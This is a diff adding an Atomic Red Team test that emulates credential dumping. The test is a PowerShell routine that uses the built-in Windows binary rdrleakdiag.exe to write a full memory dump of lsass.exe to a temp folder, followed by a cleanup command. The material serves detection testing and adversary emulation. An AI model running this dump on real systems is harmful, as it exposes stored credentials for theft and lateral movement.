@@ -352,3 +352,30 @@ atomic_tests:
       Remove-Item #{output_file} -ErrorAction Ignore
     name: powershell
     elevation_required: true
+- name: Dump LSASS.exe using lolbin rdrleakdiag.exe
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. 
+    This can be achieved with lolbin rdrleakdiag.exe. 
+
+    Upon successful execution, you should see the following files created, $env:TEMP\minidump_<PID>.dmp and  $env:TEMP\results_<PID>.hlk.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      if (Test-Path -Path "$env:SystemRoot\System32\rdrleakdiag.exe") {
+            $binary_path = "$env:SystemRoot\System32\rdrleakdiag.exe"
+        } elseif (Test-Path -Path "$env:SystemRoot\SysWOW64\rdrleakdiag.exe") {
+            $binary_path = "$env:SystemRoot\SysWOW64\rdrleakdiag.exe"
+        } else {
+            $binary_path = "File not found"
+            exit 1
+        }
+      $lsass_pid = get-process lsass |select -expand id
+      if (-not (Test-Path -Path"$env:TEMP\t1003.001-13-rdrleakdiag")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
+      write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
+      & $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
+      Write-Host "Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory."
+    cleanup_command: |
+      Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
